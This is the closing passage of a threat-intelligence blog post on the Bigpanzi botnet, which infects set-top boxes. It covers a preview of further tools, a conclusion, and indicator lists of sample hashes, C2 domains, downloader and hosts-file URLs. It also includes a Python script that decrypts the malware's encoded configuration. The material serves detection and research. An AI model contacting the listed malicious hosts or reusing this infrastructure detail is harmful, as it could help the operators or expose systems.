src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_vitw.png" class="kg-image" alt="pan_vitw.png" loading="lazy"></figure><h1 id="0x04-preview-of-the-next-article">0x04: Preview of the Next Article</h1><p>Bigpanzi has made many tools, but this article mainly looks at its key parts: pandoraspear and pcdn, because we don't have much space. We'll explore more of their tools in future articles. Here’s a sneak peek at what we'll discuss next.</p><p><strong>ptcrack</strong>: Implemented in the Go programming language, ptcrack is a cracker targeting multiple protocols. </p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2024/01/pan_crackerfunc.png" class="kg-image" alt="pan_crackerfunc.png" loading="lazy"></figure><p>We will explore activities related to ptcrack that were uncovered during our command tracking.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_ptt.png" class="kg-image" alt="pan_ptt.png" loading="lazy"></figure><ul><li><strong>p2p_peer</strong>: This component utilizes the Peer-to-Peer (P2P) protocol to discover nodes within the Pandora-CDN network. </li></ul><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_p2p.png" class="kg-image" alt="pan_p2p.png" loading="lazy"></figure><p>Notably, p2p_peer provides an HTTP service on port 7172. This exposed web service has been mapped in our Global Hawk platform, accumulating over 270,000 IP addresses.</p><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_p2pmap.png" class="kg-image" alt="pan_p2pmap.png" loading="lazy"></figure><ul><li><strong>Business APKs</strong>: These are applications that utilize Pandora-CDN for streaming video and live broadcasts. Some domains used within these apps establish a link between pandoraspear and pcdn, showing the interconnected nature of these tools within the Bigpanzi group's operations.</li></ul><figure class="kg-card kg-image-card"><img src="https://blog.xlab.qianxin.com/content/images/2023/12/pan_apk.png" class="kg-image" alt="pan_apk.png" loading="lazy"></figure><p></p><h1 id="0x05-conclusion">0x05: Conclusion</h1><p>Over the past eight years, Bigpanzi has been operating covertly, silently amassing wealth from the shadows. With the progression of their operations, there has been a significant proliferation of samples, domain names, and IP addresses. Over these years, these have accumulated in substantial numbers. Moreover, due to the reuse of code and infrastructure, there are complex connections between the samples, domain names, and IP addresses.</p><p>In the face of such a large and intricate network, our findings represent just the tip of the iceberg in terms of what Bigpanzi encompasses. There's a vast amount of tracing and investigative work still to be undertaken. For instance, understanding the purpose of domain names in the hosts files, analyzing the multitude of APKs under the /marketdatas/apk pattern, and exploring the relationship between Bigpanzi and FoneStar are crucial next steps.</p><p>The analysis presented in this article is but a faint light in the darkness, illuminating a small part of the shadowy existence of Bigpanzi. We welcome insights from the cybersecurity community and invite collaboration from those with the motivation and capability to manage such threats. Together, there's an opportunity to combat the Bigpanzi group and contribute to maintaining cybersecurity.</p><h1 id="ioc">IOC</h1>
<h3 id="pandoraspear-sample">pandoraspear sample</h3>
<pre><code>16047c1cbc51a1e625465a60092499aa
4079859aae0c6a46c6ba3516bdb500d0
59956383454c03084cfc568780a1ac1b
c8b83db92478fc2a1b1e10885ae85d92
ed69a2228a1280d1bce51b11bc7857d4
044122d46b874892227239ef9a1e7b3c
1bcc313bf3429bcf484f3fafe68726b0
a4f1808d4430fc2bbf5dc6749388727e
adb3efa194ca5aa377aa53a262744ca1

</code></pre>
<h3 id="pandoraspear-c2">pandoraspear C2</h3>
<pre><code>apz.bsaldo.com
jgp.pdltdgie.com
ok3.mf1ve.com
pcn.panddna.com
ppn.pnddon.com
abcr.ftsym1.com
apz.pdonno.com
ok3.mflve.com
wrkv.jiexi.com
209.239.115.231	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC

</code></pre>
<h3 id="pcdn-sample">pcdn sample</h3>
<pre><code>95357a1d45deebd8bdc4ac01a4ad8c08
7ccdaa9aa63114ab42d49f3fe81519d9
5b2727ba2924fd4d204bf39e601bb77c
4338e9bd02b42eb458f8515caa3bab8e
634c0e7fcc9529005a63c2918ad9dcc5
</code></pre>
<h3 id="pcdn-c2">pcdn C2</h3>
<pre><code>
zas8wie.snarutox.com
in32hbccw.oneconcord.net
pu9z3cca.trumpary.com
kp519bpa.fireisi.com
hgxx123p.ourhousei.com

ryy8zc.dotxui.com 
plart2z.incenu.com 
nikcc32.honisu.com 
wwrc9.ngoox.com 
iptty3m.dotxui.com 

</code></pre>
<h3 id="pcdn-domain">pcdn domain</h3>
<pre><code>pcdnbus.ou2sv.com
pcdnbus-bk.a2k3v.com
</code></pre>
<h3 id="ddos-builder-c2">DDoS builder C2</h3>
<pre><code>stpoto.sdfaf1230app.net
ruetsm.mkuspt.com
dlewals.adfoiadf892.net
redavss.noip.me
alchaes.abdc11.com
</code></pre>
<h3 id="downloader">Downloader</h3>
<pre><code>50.7.118.114:19090	United States|California|Los Angeles	AS174|Cogent Communications
50.7.118.114:19091	United States|California|Los Angeles	AS174|Cogent Communications
ak.tknxg.cf:8080
fadfa.dyanoe.com:8080
fadfa.gdalieyw.com:8080
fadfatest.pneydn.com
bas.sw1ez.com:8080
bps.tr2eq.com:8080
caq.xv8ta.com:8080
tano.jdsefbe.com:8080
tano.syhs8u.com:8080
tigx.xjs7zu.com:8080
tigx.xsefbe.com:8080
tyu.sdhenbe.com:8080
vpr.pprv1.com:8080
xihb.bhowljw1.com:8080
xihb.lgewer1f.com:8080
xtsj.ofdad3.com:8080
xtsj.sisenji.com:8080
xtsj.syshebe.com:8080
xtsj.terwea.com:8080
yuo.tyt3s.com:8080
tyu.fart1.com:8080

</code></pre>
<h3 id="hosts-downloader">Hosts Downloader</h3>
<pre><code>http://pandoramain-1794008345.us-west-2.elb.amazonaws.com:8080/marketdatas/dns/hosts
http://pandorabackup-1322908155.us-west-2.elb.amazonaws.com:8080/marketdatas/dns/hosts
http://pcn.panddna.com:8080/marketdatas/dns/hosts

http://eumk.wak2p.com:8080/marketdatas/dns/hosts


</code></pre>
<h3 id="hosts">Hosts</h3>
<pre><code>
www.qicicloud.xyz www.tenlsi1.club
api.qicicloud.xyz api.tenlsi1.club
71.19.252.13 ok3.mflve.com	Canada|British Columbia|Coquitlam	AS11831|eSecureData
23.12.198.13 ageniustv1.cc	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
54.149.89.70 eumk.wak2p.com	United States|Oregon|Portland	AS16509|Amazon.com, Inc.
71.19.250.242 lof.sty1x.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
207.38.87.205 mak.wak2p.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
23.12.198.15 ageniusapp.cc	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
23.12.198.15 sevenmiddleware.cf	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
23.12.198.15 isam.homelinux.com	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
23.12.198.15 pastebin.com	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
23.12.198.15 channels2.homelinux.com	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
209.239.115.206 vup.k2glu.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
199.189.87.86 qhwh.waks2.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
199.189.87.86 gt3.kt2wt.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
192.200.112.10 pukpa.slkd4.com	United States|Utah|Ogden	AS53850|GorillaServers, Inc.
71.19.250.242 ji1.mxq1b.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
207.38.87.205 pf3a.res4f.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
50.30.37.108 pcdnfuc.ou2sv.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
209.126.116.211 plslb.ou2sv.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
71.19.250.242 btyu.pifsq.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
209.239.115.206 vup.k2glu.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
142.0.141.169 cdab.p2mqt.com	United States|California|San Jose	AS54600|PEG TECH INC
94.75.218.122 b1.str2c.com	The Netherlands|Noord-Holland|Amsterdam	AS60781|LeaseWeb Netherlands B.V.
81.171.0.77 img.p2mqt.com	The Netherlands|Noord-Holland|Amsterdam	AS60781|LeaseWeb Netherlands B.V.
23.12.198.18 ageniusvod.cc	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
18.182.215.73 dmdz.res4f.com	Japan|Tokyo|Tokyo	AS16509|Amazon.com, Inc.
18.182.215.73 p5x.ty3w2.com	Japan|Tokyo|Tokyo	AS16509|Amazon.com, Inc.
71.19.250.244 jdak.jdsaf.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
71.19.250.244 jdl.oygaf.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
71.19.250.244 hts.nfdaf.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
71.19.250.244 hsh.kfdaf.com	Canada|British Columbia|Vancouver	AS11831|eSecureData
207.38.87.205 jdz.lgdaf.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
207.38.87.205 zms.mgfdaf.com	United States|Missouri|Saint Louis	AS30083|GoDaddy.com, LLC
52.8.212.100 snh.oygaf.com	United States|California|San Francisco	AS16509|Amazon.com, Inc.
54.183.19.241 snh.kfdaf.com	United States|California|San Francisco	AS16509|Amazon.com, Inc.
23.12.198.16 brasilhtv-epg1.cc	China|Taiwan|Taipei City	AS16625|Akamai Technologies, Inc.
71.19.252.13 abcr.ftsym1.com	Canada|British Columbia|Coquitlam	AS11831|eSecureData
71.19.252.13 ok3.mf1ve.com	Canada|British Columbia|Coquitlam	AS11831|eSecureData
118.184.69.3 vfz.str2c.com	China|Hongkong|Hongkong	AS137443|Anchnet Asia Limited
142.0.141.169 dcs.reakf.com	United States|California|San Jose	AS54600|PEG TECH INC
198.255.88.146 dcs.tefds.com	Canada|Ontario|Toronto	AS174|Cogent Communications
198.16.66.162 gsb.reakf.com	The Netherlands|Noord-Holland|Haarlem	AS174|Cogent Communications
23.237.10.90 gsb.tefds.com	United States|Colorado|Denver	AS174|Cogent Communications
34.98.72.97 jdl.pugexiz.com	United States|None|None	AS396982|Google LLC
34.36.1.200 jdl.hgdsd.com	United States|California|Mountain View	AS396982|Google LLC

</code></pre>
<h3 id="appendix">Appendix</h3>
<pre><code>#python script ,which can decrypt the hosts,cmd,/data/.ms
#only test in ida7.6
#pip install pycryptodome

import struct
from Crypto.Cipher import Blowfish

tab = "./0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

dec="2Sk28.BdtyL1A75rS.9ZFTc/hLgg90NI6jD0xhGS41H01Pe.RupYy1tJ7PS1"
out = b""
mylist = []
output = []


for i in range(len(dec)):
    index=tab.find(dec[i])
    mylist.append(index)

for i in range(0,len(mylist),6):
    tmp=0
    for j in range(6):
        tmp^=mylist[i+j]&lt;&lt;(j*6)
    output.append(tmp)


output[0::2],output[1::2]=output[1::2],output[0::2]
for i in output:
    s = struct.pack('&gt;L', i)
    out += s

bl = Blowfish.new(b"zAw2xidjP3eHQ", Blowfish.MODE_ECB)
plaintxt = bl.decrypt(out)
print(plaintxt)
# plaintext  --&gt;  1000@12.00AC:37:43:A1:0B:A7@0009@19944@\x00

</code></pre>
<p></p>
    </section>

    <section class="article-comments gh-canvas">
        <div id="disqus_thread"></div>
        <script>
            var disqus_config = function () {
                this.page.url = "https://blog.xlab.qianxin.com/bigpanzi-exposed-hidden-cyber-threat-behind-your-stb/";  
                this.page.identifier = "ghost-659ce2f9db9b6e000162efad"
            };
            (function() {
            var d = document, s = d.createElement('script');
            s.src = 'https://xlab-qax.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </section>
</article>
</main>





    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.xlab.qianxin.com">奇安信 X 实验室</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-rss"><a href="https://blog.xlab.qianxin.com/rss/">RSS</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=256e1729b4"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>

<script>
    tocbot.init({
        // Where to render the table of contents.
        collapseDepth: 6,
        tocSelector: '.gh-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.gh-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // Ensure correct positioning
        hasInnerContainers: true,
    });

    document.addEventListener('DOMContentLoaded', function() {
        // 获取所有包含srcset属性的元素
        var elementsWithSrcset = document.querySelectorAll('[srcset]');

        // 循环遍历每个元素并删除srcset属性
        elementsWithSrcset.forEach(function(element) {
            element.removeAttribute('srcset');
        });
    });
</script>



</body>
</html>
